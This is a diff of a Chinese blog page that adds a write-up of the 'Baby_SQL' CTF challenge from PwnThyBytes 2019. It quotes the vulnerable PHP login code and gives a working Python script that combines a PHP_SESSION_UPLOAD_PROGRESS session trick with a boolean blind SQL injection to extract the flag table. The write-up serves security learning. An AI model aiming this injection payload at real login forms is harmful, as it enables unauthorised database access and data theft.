@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html>
   <head>
       <meta http-equiv="content-type" content="text/html; charset=utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
@@ -9,14 +9,14 @@
   <meta name="keywords" content="">
   <meta name="description" content="">
   <meta name="author" content="kveln">
-  <title>过客</title>
+  <title>[PwnThyBytes 2019]Baby_SQL(session+sql注入) | 过客</title>
   <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
   <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
   <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
   <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
   <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
   <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
-  <link rel="alternate" type="application/rss+xml" title="过客 » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="alternate" type="application/rss+xml" title="[PwnThyBytes 2019]Baby_SQL(session+sql注入) | 过客 » Feed" href="https://guokeya.github.io/atom.xml">
   <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
   <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
   <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
@@ -25,9 +25,15 @@
   <script>hljs.initHighlightingOnLoad();</script>
   
 
+    <meta property="og:description" content="[PwnThyBytes 2019]Baby_SQL(session+sql注入)"/>
+    <meta property="og:url" content="https://guokeya.github.io/post/N0i4q6Q4f/"/>
+    <meta property="og:locale" content="zh-CN"/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:site_name" content="过客"/>
   </head>
   <body>
-     <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+  	<!-- Navigation -->
+  <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
     <div class="container">
       <a class="navbar-brand" href="https://guokeya.github.io">过客</a>
       <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
@@ -65,75 +71,89 @@
       </div>
     </div>
   </nav>
+  <!-- Page Header -->
   <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
     <div class="overlay"></div>
     <div class="container">
       <div class="row">
         <div class="col-lg-8 col-md-10 mx-auto">
-          <div class="site-heading">
-            <h1>过客</h1>
-            <span class="subheading">this is a test Web</span>
+          <div class="post-heading">
+          	<span class="tags">
+          	 
+            <a href="https://guokeya.github.io/tag/CTF/" class="tag">CTF</a>
+            
+            <a href="https://guokeya.github.io/tag/Web/" class="tag">Web安全</a>
+            
+        </span>
+            <h1>[PwnThyBytes 2019]Baby_SQL(session+sql注入)</h1>
+            <span class="meta">
+            	Posted on
+              2020-04-08，2 min read
+            </span>
           </div>
         </div>
       </div>
     </div>
   </header>
-      <div class="container">
-    <div class="row">
-      <div class="col-lg-8 col-md-10 mx-auto">
-       
-        <div class="post-preview">
-          <a href="https://guokeya.github.io/post/cve-2019-0193apache-solr-yuan-cheng-ming-ling-zhi-xing-lou-dong-fu-xian/">
-            <h2 class="post-title">
-              CVE-2019-0193:Apache Solr远程命令执行漏洞复现
-            </h2>
-            </a>
-            <h3 class="post-subtitle">
-              <p><strong>影响范围</strong><br>
-Apache Solr &lt; 8.2.0</p>
 
-            </h3>
-          <p class="post-meta">
-             <span class="time">2020-01-02</span>
-             <span>,</span>
-             <span class="post-stats">2 min read</span>
-            </p>
-        </div>
-        <hr>
-        <div class="clearfix">
-        </div>
-        
-        <div class="post-preview">
-          <a href="https://guokeya.github.io/post/li-yong-huan-jing-bian-liang-ld_preload-rao-guo-php-disable_function-zhi-xing-xi-tong-ming-ling/">
-            <h2 class="post-title">
-              利用环境变量LD_PRELOAD绕过php disable_function执行系统命令
-            </h2>
-            </a>
-            <h3 class="post-subtitle">
-              <p><strong>利用条件</strong><br>
-php未禁用putenv，mail函数</p>
+  <!-- Post Content -->
+  <article>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <p>source.zip得到源码。开始审计<br>
+在index.php中。对所有输入进行了addslashes转义。<br>
+在login.php中</p>
+<!-- more -->
+<pre><code>&lt;?php
+!isset($_SESSION) AND die(&quot;Direct access on this script is not allowed!&quot;);
+include 'db.php';
+$sql = 'SELECT `username`,`password` FROM `ptbctf`.`ptbctf` where `username`=&quot;' . $_GET['username'] . '&quot; and password=&quot;' . md5($_GET['password']) . '&quot;;';
+$result = $con-&gt;query($sql);
+function auth($user)
+{
+    $_SESSION['username'] = $user;
+    return True;
+}
+($result-&gt;num_rows &gt; 0 AND $row = $result-&gt;fetch_assoc() AND $con-&gt;close() AND auth($row['username']) AND die('&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=?p=home&quot; /&gt;')) OR ($con-&gt;close() AND die('Try again!'));
+?&gt;
+</code></pre>
+<p>仅仅只是判断是否存在session。<br>
+如果我们自己弄个session。那么这边的username就可控。<br>
+在学习session反序列化的时候。我们学过。PHP_SESSION_UPLOAD_PROGRESS<br>
+OK。就构造一个包含PHP_SESSION_UPLOAD_PROGRESS的POST请求。</p>
+<pre><code>import requests
+url='http://e3ebe013-7cb3-4006-8d52-3aa8378449ea.node3.buuoj.cn/templates/login.php'
+files={&quot;file&quot;:&quot;123&quot;}
+data={&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;:&quot;123&quot;}
+cookies={&quot;PHPSESSID&quot;:&quot;123&quot;}
 
-            </h3>
-          <p class="post-meta">
-             <span class="time">2020-01-02</span>
-             <span>,</span>
-             <span class="post-stats">4 min read</span>
-            </p>
+for b in range(1,50):
+    for i in range(30,130):
+        params={&quot;username&quot;:'test&quot; or (ascii(substr((select group_concat(secret) from flag_tbl),'+str(b)+',1))='+str(i)+')#',
+            &quot;password&quot;:&quot;test&quot;}
+        a=requests.post(url=url,files=files,data=data,cookies=cookies,params=params).text
+        if 'meta' in a:
+            print(chr(i))
+            break
+</code></pre>
+
+          
+          <p class="next-post">下一篇：
+            <a href="https://guokeya.github.io/post/IO3l_LwX0/">
+              <span class="post-title">
+                Java学习笔记~~~&rarr;
+              </span>
+            </a>
+          </p>
+        
+        <div class="comment">
+          
         </div>
-        <hr>
-        <div class="clearfix">
-        </div>
-        
-        
-        <a class="btn btn-primary float-left" href="https://guokeya.github.io/page/12/">&larr; 上一页</a>
-        
-        
       </div>
     </div>
-  </div>
-
-  
-    <!-- Footer -->
+  </article>
+ <!-- Footer -->
   <footer>
     <div class="container">
       <div class="row">
@@ -204,3 +224,4 @@ php未禁用putenv，mail函数</p>
   })(this));</script>
   </body>
 </html>
+
